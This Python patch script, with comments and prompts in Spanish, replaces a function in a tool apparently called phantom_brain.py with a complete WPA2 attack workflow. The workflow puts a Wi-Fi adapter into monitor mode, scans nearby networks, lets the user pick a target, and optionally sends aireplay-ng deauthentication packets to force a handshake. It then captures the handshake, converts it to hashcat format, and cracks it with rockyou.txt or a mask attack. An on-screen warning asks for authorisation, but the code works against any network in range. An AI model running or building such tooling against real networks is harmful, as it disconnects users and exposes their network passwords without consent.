"""
Parche v2 - Reemplaza menu_captura_vivo() con flujo completo:
1. Verificacion + activacion modo monitor
2. Escaneo 60s con lista de redes
3. Seleccion de objetivo
4. Deauth opcional con advertencia
5. Captura dirigida
6. Conversion hc22000 + oferta de crackeo
7. Analisis IA
"""

import re

ARCHIVO = "phantom_brain.py"

# Leer archivo
with open(ARCHIVO, "r", encoding="utf-8") as f:
    contenido = f.read()

# Buscar inicio y fin de la funcion actual
inicio = contenido.find('def menu_captura_vivo():')
if inicio == -1:
    print("[ERROR] No se encontro menu_captura_vivo() en phantom_brain.py")
    exit(1)

# Buscar el inicio de la siguiente funcion al mismo nivel de indentacion
fin = contenido.find('\ndef obtener_input()', inicio)
if fin == -1:
    fin = contenido.find('\ndef ', inicio + 10)
if fin == -1:
    print("[ERROR] No se pudo determinar el fin de la funcion.")
    exit(1)

NUEVA_FUNCION = '''def menu_captura_vivo():
    """Captura WPA2 handshakes en vivo con Atheros AR9271 - flujo completo."""
    import subprocess
    import time

    INTERFAZ = "wlan1"
    INTERFAZ_MON = "wlan1mon"
    DIRECTORIO_PCAP = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pcap")
    os.makedirs(DIRECTORIO_PCAP, exist_ok=True)

    print("\\n" + "="*55)
    print("  CAPTURA EN VIVO - ATHEROS AR9271 (Raspberry Pi)")
    print("="*55)

    # --- PASO 1: Verificar interfaz monitor ---
    resultado = subprocess.run(["iwconfig"], capture_output=True, text=True)
    if INTERFAZ_MON not in resultado.stdout:
        print(f"\\n[!] Interfaz {INTERFAZ_MON} no detectada.")
        activar = input("    Activar modo monitor ahora? (s/n): ").strip().lower()
        if activar == "s":
            print(f"    Ejecutando: sudo airmon-ng start {INTERFAZ}")
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
            subprocess.run(["sudo", "airmon-ng", "start", INTERFAZ], capture_output=True)
            time.sleep(2)
            resultado = subprocess.run(["iwconfig"], capture_output=True, text=True)
            if INTERFAZ_MON not in resultado.stdout:
                print(f"[ERROR] No se pudo activar {INTERFAZ_MON}. Abortando.")
                return None
        else:
            print("[!] Operacion cancelada.")
            return None

    print(f"[OK] {INTERFAZ_MON} en modo monitor activa.")

    # --- PASO 2: Escaneo de redes ---
    print("\\n[1] Escaneando redes WiFi por 60 segundos...")
    print("    Presiona Ctrl+C para detener el escaneo antes.")
    print()

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    archivo_scan = os.path.join(DIRECTORIO_PCAP, f"scan_{timestamp}")

    try:
        proc = subprocess.Popen([
            "sudo", "airodump-ng",
            "--output-format", "csv",
            "-w", archivo_scan,
            INTERFAZ_MON
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        for i in range(60, 0, -5):
            print(f"    {i} segundos restantes...", end="\\r")
            time.sleep(5)
        print()
        proc.terminate()
        proc.wait()
    except KeyboardInterrupt:
        print("\\n[OK] Escaneo detenido manualmente.")
        proc.terminate()
        proc.wait()

    # --- PASO 3: Parsear CSV y mostrar redes ---
    archivo_csv = archivo_scan + "-01.csv"
    redes = []

    if os.path.exists(archivo_csv):
        try:
            with open(archivo_csv, "r", encoding="utf-8", errors="ignore") as f:
                lineas = f.readlines()

            seccion_redes = True
            for linea in lineas:
                linea = linea.strip()
                if not linea:
                    seccion_redes = False
                    continue
                if linea.startswith("BSSID") or linea.startswith("Station"):
                    continue
                if seccion_redes and "," in linea:
                    partes = [p.strip() for p in linea.split(",")]
                    if len(partes) >= 14 and len(partes[0]) == 17:
                        bssid = partes[0]
                        canal = partes[3].strip()
                        potencia = partes[8].strip()
                        privacidad = partes[5].strip()
                        essid = partes[13].strip() if len(partes) > 13 else "<oculto>"
                        if not essid:
                            essid = "<oculto>"
                        redes.append({
                            "bssid": bssid,
                            "canal": canal,
                            "potencia": potencia,
                            "privacidad": privacidad,
                            "essid": essid
                        })
        except Exception as e:
            print(f"[WARN] Error parseando CSV: {e}")

    if not redes:
        print("[ERROR] No se detectaron redes. Intenta aumentar el tiempo de escaneo.")
        return None

    print(f"\\n[2] Redes detectadas ({len(redes)}):")
    print(f"\\n{\'#\':<4} {\'ESSID\':<25} {\'BSSID\':<19} {\'CH\':<5} {\'PWR\':<6} {\'ENC\'}")
    print("-" * 70)
    for i, red in enumerate(redes, 1):
        print(f"{i:<4} {red[\'essid\']:<25} {red[\'bssid\']:<19} {red[\'canal\']:<5} {red[\'potencia\']:<6} {red[\'privacidad\']}")

    # --- PASO 4: Seleccion de objetivo ---
    print()
    try:
        seleccion = int(input("Selecciona el numero de red objetivo (0 para cancelar): ").strip())
    except ValueError:
        print("[ERROR] Seleccion invalida.")
        return None

    if seleccion == 0:
        return None
    if seleccion < 1 or seleccion > len(redes):
        print("[ERROR] Numero fuera de rango.")
        return None

    objetivo = redes[seleccion - 1]
    print(f"\\n[OK] Objetivo: {objetivo[\'essid\']} | {objetivo[\'bssid\']} | Canal {objetivo[\'canal\']}")

    # --- PASO 5: Deauth opcional con advertencia ---
    print()
    print("=" * 55)
    print("  ADVERTENCIA - DEAUTENTICACION")
    print("=" * 55)
    print("  El ataque deauth desconecta clientes de la red")
    print("  para forzar una reconexion y capturar el handshake.")
    print("  SOLO usar en redes propias o con autorizacion")
    print("  explicita del propietario.")
    print("=" * 55)
    usar_deauth = input("\\n  Usar deauth para forzar handshake? (s/n): ").strip().lower()

    # --- PASO 6: Captura dirigida ---
    timestamp2 = time.strftime("%Y%m%d_%H%M%S")
    archivo_captura = os.path.join(DIRECTORIO_PCAP, f"captura_vivo_{timestamp2}")

    print(f"\\n[3] Iniciando captura dirigida en canal {objetivo[\'canal\']}...")
    print(f"    Archivo: {archivo_captura}-01.cap")
    print("    Presiona Ctrl+C cuando captures el handshake.\\n")

    try:
        proc_cap = subprocess.Popen([
            "sudo", "airodump-ng",
            "-c", objetivo["canal"],
            "--bssid", objetivo["bssid"],
            "-w", archivo_captura,
            INTERFAZ_MON
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if usar_deauth == "s":
            time.sleep(5)
            print("[4] Lanzando deauth (10 paquetes)...")
            subprocess.run([
                "sudo", "aireplay-ng",
                "--deauth", "10",
                "-a", objetivo["bssid"],
                INTERFAZ_MON
            ], capture_output=True)
            print("[OK] Deauth enviado. Esperando reconexion y handshake...")

        proc_cap.wait()

    except KeyboardInterrupt:
        print("\\n[OK] Captura detenida.")
        proc_cap.terminate()
        proc_cap.wait()

    # --- PASO 7: Verificar y convertir ---
    archivo_cap = f"{archivo_captura}-01.cap"
    if not os.path.exists(archivo_cap):
        print(f"[ERROR] No se genero el archivo de captura.")
        return None

    print(f"\\n[OK] Captura guardada: {archivo_cap}")
    archivo_hash = archivo_captura + ".hc22000"

    print("[5] Convirtiendo a formato hashcat (hc22000)...")
    try:
        subprocess.run([
            "hcxpcapngtool", "-o", archivo_hash, archivo_cap
        ], capture_output=True, text=True)

        if os.path.exists(archivo_hash) and os.path.getsize(archivo_hash) > 0:
            print(f"[OK] Hash generado: {archivo_hash}")

            # --- PASO 8: Ofrecer crackeo ---
            crackear = input("\\n[6] Hash listo. Iniciar crackeo con rockyou.txt ahora? (s/n): ").strip().lower()
            if crackear == "s":
                wordlist = "/home/otto/rockyou.txt"
                if not os.path.exists(wordlist):
                    wordlist = input("    Ruta al wordlist: ").strip()
                print(f"\\n    Ejecutando hashcat -m 22000 {archivo_hash} {wordlist}")
                print("    Presiona \'s\' para ver status, \'q\' para salir.\\n")
                subprocess.run([
                    "hashcat", "-m", "22000", archivo_hash, wordlist
                ])
        else:
            print("[WARN] No se generaron hashes. Puede que no haya handshake completo.")

    except Exception as e:
        print(f"[WARN] hcxpcapngtool fallo: {e}")

    # --- PASO 9: Parsear para analisis IA ---
    print("\\n[7] Analizando captura con IA...")
    try:
        from pcap_parser_v2 import parsear_pcap
        resultado_parse = parsear_pcap(archivo_cap)
        if resultado_parse:
            return resultado_parse, False, "WPA2", None
    except Exception as e:
        print(f"[WARN] Parser automatico fallo: {e}")

    contenido = f"""=== CAPTURA EN VIVO WPA2 ===
ESSID: {objetivo[\'essid\']}
BSSID: {objetivo[\'bssid\']}
Canal: {objetivo[\'canal\']}
Archivo cap: {archivo_cap}
Hash hc22000: {archivo_hash if os.path.exists(archivo_hash) else \'No generado\'}
Deauth usado: {\'Si\' if usar_deauth == \'s\' else \'No\'}
Timestamp: {timestamp2}

Comandos de crackeo:
hashcat -m 22000 {archivo_hash} /home/otto/rockyou.txt
hashcat -m 22000 {archivo_hash} -a 3 ?l?l?l?l?d?d?d?d
"""
    return contenido, False, "WPA2", None

'''

# Reemplazar
nuevo_contenido = contenido[:inicio] + NUEVA_FUNCION + contenido[fin:]

with open(ARCHIVO, "w", encoding="utf-8") as f:
    f.write(nuevo_contenido)

print("[OK] Parche aplicado correctamente.")
print("[OK] menu_captura_vivo() reemplazada con flujo completo v2.")
print("Verificar con: python3 phantom_brain.py")
